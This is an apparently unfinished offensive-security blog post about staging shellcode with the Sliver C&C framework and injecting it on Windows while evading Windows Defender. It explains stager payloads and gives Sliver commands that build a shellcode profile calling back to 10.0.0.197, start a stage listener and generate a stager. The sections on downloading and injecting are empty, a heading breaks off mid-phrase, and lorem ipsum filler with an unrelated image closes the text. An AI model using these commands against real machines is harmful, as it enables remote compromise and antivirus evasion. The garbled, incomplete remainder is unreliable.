---
title: C Program - Download and Inject ShellCode With Sliver
date: "2021-01-01"
---

In this post we're going to create a C program that will get some shellcode and inject it into a process and fully bypassing Windows Defender (as of January 1, 2021).<!-- end -->
## 1.  Basics of Stager payloads

Before starting we need to understand what stager payloads are. If you've used Metasploit Framework then you might've seen that word being thrown around but never really understood what it means. In simple terms a stager is reponsible for establishing commmunication with the attacker's machine and downloading and executing a larger payload called the Stage. You may ask why we don't just download the Stage directly instead of having our stager download the stage. Well the reality is you won't always have the luxury of having unlimited memory for bytes. If you've done challenging Buffer Overflow labs then you see sometimes your limited to a certain amount of bytes, in that case you'd need to fit a small payload to grab your large payload.

## 2.  Sliver C&C Framework

I ran into Sliver while searching for different open source C&C frameworks to try out. We'll be using it to generate a stager and then establish communication with our target machine. Although it's still in beta mode, it has some impressive feautures you can check it out <a href="https://github.com/BishopFox/sliver">here</a>.

First we're going to generate a profile for our shellcode:

```javascript
new-profile --profile-name mrd0x-shellcode --mtls 10.0.0.197:443 --skip-symbols --format shellcode
```

*   --profile-name mrd0x-shellcode : Specifies the name of the generated profile
*   --mtls 10.0.0.197:443 : Specifies the use of Mutual-TLS and the listening IP and Port
*   --skip-symbols : Less stealthy payload is generated
*   --format shellcode: The format of the payload that will be used by this profile

Next we're going to start our listener and link the profile created in the previous step:

```javascript
stage-listener --url tcp://10.0.0.197:80 --profile mrd0x-shellcode
```

Finally we'll generate our stager file and set the listener IP and port:

```javascript
generate stager --lhost 10.0.0.197 --lport 80
```

## 3.  Using the WinSock2 Library to Download Our Stager



## 4.  Injecting shellcode into


![Train Tracks](./traintrack.jpg)

Nullam tristique ante quis gravida aliquet. Donec elementum, leo eu interdum mattis, erat quam vestibulum nunc, nec convallis eros risus ut enim. Sed maximus odio tincidunt velit congue molestie. Nunc in pharetra eros, id pulvinar justo. Pellentesque quis accumsan leo. Praesent efficitur magna a posuere viverra. Morbi sit amet tincidunt mauris. Vestibulum sed maximus felis.
